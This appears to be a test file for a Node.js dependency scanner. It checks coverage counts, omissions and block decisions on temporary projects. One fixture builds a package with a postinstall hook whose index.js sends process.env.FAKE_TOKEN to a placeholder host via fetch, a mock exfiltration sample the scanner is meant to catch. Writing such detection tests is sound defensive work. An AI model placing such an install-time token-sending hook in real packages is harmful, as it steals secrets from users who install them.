import assert from "node:assert/strict";
import { mkdtemp, mkdir, readFile, rm, symlink, truncate, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import { scanProject } from "./project.js";

test("offline project scanning reports installed direct coverage, gaps, bounds and strongest policy without mutations", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "unsus-project-"));
  try {
    const manifest = JSON.stringify({ dependencies: { alpha: "^1.0.0", blocked: "1.0.0", linked: "1.0.0", missing: "1.0.0", workspace: "workspace:*" }, devDependencies: { dev: "1.0.0" } });
    await writeFile(path.join(root, "package.json"), manifest);
    await writeFile(path.join(root, "package-lock.json"), 'unchanged lock sentinel');
    for (const name of ["alpha", "blocked", "dev"]) {
      const dir = path.join(root, "node_modules", name);
      await mkdir(dir, { recursive: true });
      await writeFile(path.join(dir, "package.json"), JSON.stringify({ name, version: "1.0.0", ...(name === "blocked" ? { scripts: { postinstall: "node index.js" } } : {}) }));
      await writeFile(path.join(dir, "index.js"), name === "blocked" ? 'fetch("https://example.invalid", {body:process.env.FAKE_TOKEN});' : 'module.exports = 1;');
    }
    await symlink(path.join(root, "node_modules/alpha"), path.join(root, "node_modules/linked"), 'dir');
    const report = await scanProject(root);
    assert.equal(report.exitCode, 2);
    assert.equal(report.decision, "block");
    assert.equal(report.coverage.scanned, 2);
    assert.equal(report.coverage.unresolved, 2);
    assert.equal(report.coverage.omitted, 1);
    assert.equal(report.coverage.complete, false);
    assert.equal(report.coverage.transitiveDependenciesAnalyzed, false);
    assert.equal(report.coverage.lockfileVerified, false);
    assert.equal(report.dependencies.find(item => item.name === "blocked")?.report?.decision, "block");
    const limited = await scanProject(root, { maxPackages: 1, includeDev: true });
    assert.equal(limited.coverage.scanned, 1);
    assert.equal(limited.coverage.declared, 6);
    assert.equal(limited.exitCode, 1);
    assert.equal((await scanProject(root, { includeDev: true })).coverage.scanned, 3);
    await writeFile(path.join(root, "node_modules/alpha/package.json"), '{');
    const failed = await scanProject(root);
    assert.equal(failed.exitCode, 3);
    assert.equal(failed.decision, "block", "An operational failure must not hide a blocking finding");
    assert.equal(failed.coverage.failed, 1);
    assert.equal(await readFile(path.join(root, "package.json"), "utf8"), manifest);
    assert.equal(await readFile(path.join(root, "package-lock.json"), "utf8"), 'unchanged lock sentinel');
  } finally { await rm(root, { recursive: true, force: true }); }
});

test("project identity mismatches and oversized packages are explicit omissions, not false allows", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "unsus-project-bounds-"));
  try {
    await writeFile(path.join(root, "package.json"), '{"dependencies":{"different":"^2.0.0","huge":"1.0.0"}}');
    for (const name of ["different", "huge"]) {
      const dir = path.join(root, "node_modules", name); await mkdir(dir, { recursive: true });
      await writeFile(path.join(dir, "package.json"), JSON.stringify({ name, version: "1.0.0" }));
    }
    const huge = path.join(root, "node_modules/huge/payload.bin");
    await writeFile(huge, ''); await truncate(huge, 101 * 1024 * 1024);
    const result = await scanProject(root);
    assert.equal(result.exitCode, 1);
    assert.equal(result.coverage.scanned, 0);
    assert.equal(result.coverage.unresolved, 1);
    assert.equal(result.coverage.omitted, 1);
    await assert.rejects(scanProject(root, { maxPackages: 101 }), /1 to 100/);
  } finally { await rm(root, { recursive: true, force: true }); }
});
